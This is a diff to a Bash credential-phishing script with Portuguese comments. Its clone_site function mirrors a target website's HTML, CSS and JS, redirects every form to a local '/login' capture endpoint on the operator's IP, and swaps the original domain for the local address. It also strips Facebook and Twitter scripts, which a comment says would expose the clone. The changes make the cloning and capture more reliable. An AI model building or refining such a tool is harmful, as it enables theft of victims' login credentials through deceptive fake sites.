@@ -91,52 +91,73 @@ clone_site() {
     # 2. Baixar CSS
     echo -e "${YELLOW}[2/4] Baixando CSS...${NC}"
     local css_count=0
-    grep -oE 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//' | while read css_url; do
+    local css_list_file="$SCRIPT_DIR/.css_list"
+    grep -oE 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//' > "$css_list_file"
+    while IFS= read -r css_url; do
         [ -z "$css_url" ] && continue
         local css_file="css_${css_count}_$(basename "$css_url" | sed 's/[^a-zA-Z0-9._-]/_/g')"
+        local css_abs=""
         if echo "$css_url" | grep -q "^http"; then
-            $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "$css_url" >> "$SCRIPT_DIR/curl.log" 2>&1
+            css_abs="$css_url"
         elif echo "$css_url" | grep -q "^/"; then
-            $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "${base_domain}${css_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
+            css_abs="${base_domain}${css_url}"
         else
-            $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "${base_domain}/${css_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
+            css_abs="${base_domain}/${css_url}"
         fi
+        $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "$css_abs" >> "$SCRIPT_DIR/curl.log" 2>&1
+        # Trocar no HTML (escapar & e / pro sed)
+        local escaped_url=$(echo "$css_url" | sed 's/[&/\]/\\&/g')
+        sed -i "s|href=\"${escaped_url}\"|href=\"${css_file}\"|g" "$SITE_DIR/index.html"
         css_count=$((css_count + 1))
-        sed -i "s|href=\"$css_url\"|href=\"$css_file\"|g" "$SITE_DIR/index.html"
-    done
-    echo -e "${GREEN}  → CSS baixados${NC}"
+    done < "$css_list_file"
+    rm -f "$css_list_file"
+    echo -e "${GREEN}  → ${css_count} CSS baixados${NC}"
 
     # 3. Baixar JS
     echo -e "${YELLOW}[3/4] Baixando JS...${NC}"
     local js_count=0
-    grep -oE 'src="[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//' | while read js_url; do
+    local js_list_file="$SCRIPT_DIR/.js_list"
+    grep -oE 'src="[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//' > "$js_list_file"
+    while IFS= read -r js_url; do
         [ -z "$js_url" ] && continue
         local js_file="js_${js_count}_$(basename "$js_url" | sed 's/[^a-zA-Z0-9._-]/_/g')"
+        local js_abs=""
         if echo "$js_url" | grep -q "^http"; then
-            $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "$js_url" >> "$SCRIPT_DIR/curl.log" 2>&1
+            js_abs="$js_url"
         elif echo "$js_url" | grep -q "^/"; then
-            $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "${base_domain}${js_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
+            js_abs="${base_domain}${js_url}"
         else
-            $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "${base_domain}/${js_url}" >> "$SCRIPT_DIR/curl.log" 2>&1
+            js_abs="${base_domain}/${js_url}"
         fi
+        $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "$js_abs" >> "$SCRIPT_DIR/curl.log" 2>&1
+        local escaped_url=$(echo "$js_url" | sed 's/[&/\]/\\&/g')
+        sed -i "s|src=\"${escaped_url}\"|src=\"${js_file}\"|g" "$SITE_DIR/index.html"
         js_count=$((js_count + 1))
-        sed -i "s|src=\"$js_url\"|src=\"$js_file\"|g" "$SITE_DIR/index.html"
-    done
-    echo -e "${GREEN}  → JS baixados${NC}"
+    done < "$js_list_file"
+    rm -f "$js_list_file"
+    echo -e "${GREEN}  → ${js_count} JS baixados${NC}"
 
     # 4. Modificar formulários pra captura
     echo -e "${YELLOW}[4/4] Configurando captura...${NC}"
     local my_ip=$(get_my_ip)
+    local local_url="http://${my_ip}:${port}"
 
     # Capturar action original e redirecionar pra /login
     sed -i 's/action="[^"]*"/action="\/login"/gI' "$SITE_DIR/index.html"
     # Garantir method POST
     sed -i 's/<form\b/<form method="POST" action="\/login"/gI' "$SITE_DIR/index.html"
     # Trocar URLs do domínio original pelo IP local
-    sed -i "s|${base_domain}|http://${my_ip}:${port}|gI" "$SITE_DIR/index.html"
+    sed -i "s|${base_domain}|${local_url}|gI" "$SITE_DIR/index.html"
+    # Trocar qualquer https:// ou http:// que sobrou do domínio (segurança)
+    local domain_plain=$(echo "$base_domain" | sed 's|https\?://||')
+    sed -i "s|https\?://${domain_plain}|${local_url}|gI" "$SITE_DIR/index.html"
+    # Corrigir URLs no estilo (url(...) que apontam pro domínio)
+    sed -i "s|url(${domain_plain}|url(${local_url}|gI" "$SITE_DIR/index.html"
     # Remover integrações externas que denunciam clone
     sed -i 's/<script[^>]*src="https:\/\/connect\.facebook\.net[^"]*"[^>]*><\/script>//gI' "$SITE_DIR/index.html"
     sed -i 's/<script[^>]*src="https:\/\/platform\.twitter\.com[^"]*"[^>]*><\/script>//gI' "$SITE_DIR/index.html"
+    # Corrigir http -> https reverso (mixed content)
+    sed -i "s|http://${my_ip}|${local_url}|gI" "$SITE_DIR/index.html"
 
     echo -e "${GREEN}  → Formulários hackeados, URLs trocadas${NC}"
 
